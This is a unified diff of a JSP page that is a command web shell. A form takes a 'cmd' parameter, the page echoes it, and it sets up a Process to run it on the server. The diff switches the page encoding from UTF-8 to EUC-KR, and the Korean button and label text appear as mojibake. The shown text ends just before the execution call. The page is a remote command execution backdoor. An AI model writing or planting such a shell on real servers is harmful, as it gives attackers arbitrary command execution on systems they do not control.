@@ -1,6 +1,6 @@
 <%@ page import="java.util.*,java.io.*"%>
-<%@ page language="java" contentType="text/html; charset=UTF-8"
-    pageEncoding="UTF-8"%>
+<%@ page language="java" contentType="text/html; charset=EUC-KR"
+    pageEncoding="EUC-KR"%>
 <!DOCTYPE html>
 <html>
 <head>
@@ -10,13 +10,13 @@
 <body>
 <form method="GET" name="cmdForm" action="">
 <input type="text" name="cmd">
-<input type="submit" value="ì „ì†¡">
+<input type="submit" value="Àü¼Û">
 </form>
 <pre>
 <%
 if (request.getParameter("cmd") != null)
 {
-	out.println("ëª…ë ¹ì–´ : " + request.getParameter("cmd") + "<br>");
+	out.println("¸í·É¾î : " + request.getParameter("cmd") + "<br>");
 	
 	Process p;
 	
